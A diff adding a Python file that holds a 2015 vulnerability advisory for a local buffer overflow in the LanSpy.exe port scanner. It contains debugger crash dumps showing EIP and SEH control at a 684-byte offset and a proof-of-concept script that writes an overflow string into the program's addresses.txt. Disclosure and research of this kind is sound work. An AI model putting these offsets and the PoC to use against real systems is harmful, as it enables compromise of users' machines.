@@ -1,0 +1,136 @@
+'''
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/AS-LANSPY-BUFFER-OVERFLOW-10052015.txt
+
+
+Vendor:
+================================
+www.lantricks.com
+
+
+Product:
+================================
+LanSpy.exe
+
+LanSpy is network security and port scanner, which allows getting different
+information about computer:
+Domain and NetBios names, MAC address, Server information, Domain and
+Domain controller etc....
+
+
+Vulnerability Type:
+===================
+Buffer Overflow
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+======================
+
+LanSpy.exe uses an 'addresses.txt' plain text file which lives under the
+main LanSpy
+directory the file is used to load scanned IPs or URLs
+
+e.g.
+
+127.0.0.1
+
+replace addresses.txt file with our malicious one, the buffer overflow
+payload must
+be the very first entry in the text file. Next, run LanSpy.exe and click
+green arrow
+or use keyboard press 'F3' to start. Then KABOOM!... program crashez and we
+will control
+EIP at 684 bytes also overwrite both the NSEH & SEH exception handler
+pointers...
+
+Quick stack dump...
+
+(1274.19c4): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+
+eax=0264fb41 ebx=00418d7c ecx=0264fe84 edx=00000000 esi=00000000
+edi=00000000
+eip=41414141 esp=0264fe8c ebp=41414141 iopl=0         nv up ei pl zr na pe
+nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b
+efl=00010246
+41414141 ??              ???
+0:001> g
+
+(1274.19c4): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=00000000 ecx=52525252 edx=7714b4ad esi=00000000
+edi=00000000
+eip=52525252 esp=0264f8f0 ebp=0264f910 iopl=0         nv up ei pl zr na pe
+nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b
+efl=00010246
+52525252 ??              ???
+0:001> !exchain
+0264f904: ntdll!LdrRemoveLoadAsDataTable+d64 (7714b4ad)
+0264fe8c: 52525252
+Invalid exception stack at 42424242
+
+
+POC code(s):
+=============
+'''
+
+import os
+
+#LanSpy.exe buffer overflow POC
+#by hyp3rlinx
+#hyp3rlinx.altervista.org
+#=============================
+
+#LanSpy.exe uses an 'addresses.txt' text file
+#which lives under the LanSpy directory
+#the addresses.txt file is used to load scanned IPs or URLs
+
+#control EIP at 684 bytes... also overwrite
+#both the NSEH & SEH exception handler pointers
+#-----------------------------------------------
+
+payload="A"*684+"BBBB"+"RRRR"        #<------- KABOOOOOOOOOOOOOOOOOOM!
+
+file=open("C:\\Program Files (x86)\\LanTricks\\LanSpy\\addresses.txt", "w")
+file.write(payload)
+file.close()
+
+
+'''
+Public Disclosure:
+===================
+October 5, 2015
+
+
+Exploitation Technique:
+=======================
+Local
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
+'''
